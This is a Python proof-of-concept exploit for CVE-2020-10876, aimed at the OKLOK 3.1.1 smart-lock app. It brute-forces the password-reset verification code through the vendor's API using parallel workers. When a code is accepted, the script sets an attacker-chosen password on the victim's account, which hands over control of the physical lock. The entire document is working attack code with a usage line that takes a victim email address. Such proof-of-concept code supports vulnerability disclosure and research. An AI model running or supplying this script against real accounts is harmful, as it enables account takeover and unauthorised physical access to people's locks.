#!/usr/bin/env python3

#PoC code for CVE-2020-10876
#Brute force OKLOK 3.1.1 email verification code from 'Forgot password' and change the password of the victim account
#results in takeover of the user account and gives the attacker control of the lock

import requests
import json
import sys
import itertools
import datetime
import multiprocessing
from functools import partial


#brute force the verification code and change the password
def change_password(code, victim_email_address, new_password):

	headers = {'Host': 'app.oklok.com.cn',
	'Content-Type': 'application/json',
	'Connection': 'keep-alive',
	'Accept': '*/*',
	'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
	'Accept-Language': 'en-US;q=1',
	'Accept-Encoding': 'gzip, deflate, br'}

	change_pw_url = 'https://app.oklok.com.cn/oklock/user/forget'
	change_pw_body = {"password":new_password,"account":victim_email_address,"code":code}

	change_pw = requests.post(change_pw_url, data=json.dumps(change_pw_body), headers=headers)
	json_change_pw = change_pw.json()
	change_pw_status = json_change_pw['status']

	if change_pw_status == '2000':
		print(f'[*] Verification code found!: {code}')
		print(f'[*] Password was changed to {new_password}!')

		end_time = datetime.datetime.now()
		total_time = end_time - start_time
			
		print('\nTotal Execution Time: ' + str(total_time))
		print('-------------------------------------------------------------\n')

		return code

#main
if __name__ == '__main__':

	start_time = datetime.datetime.now() 

	codes_filename = 'verification_codes.txt'

	if len(sys.argv) is not 3:
		sys.exit('Usage: python3 ownklok_change_pw.py <victim_email_address> <new_password>')
	else:
		victim_email_address = str(sys.argv[1])
		new_password = str(sys.argv[2])
		chpw = partial(change_password, victim_email_address=victim_email_address, new_password=new_password)


	with open(codes_filename, "r") as codes_file:
		codes = codes_file.read().split("\n")

	print('\n-------------------------------------------------------------')
	print('[*] Brute forcing verification code...')

	num_workers = multiprocessing.cpu_count()
	pool = multiprocessing.Pool(num_workers)
	for i in pool.imap_unordered(chpw, codes, chunksize=100):
		result = i
		if result:
			pool.terminate()
			pool.join()
			sys.exit()

	pool.close()
	pool.join()

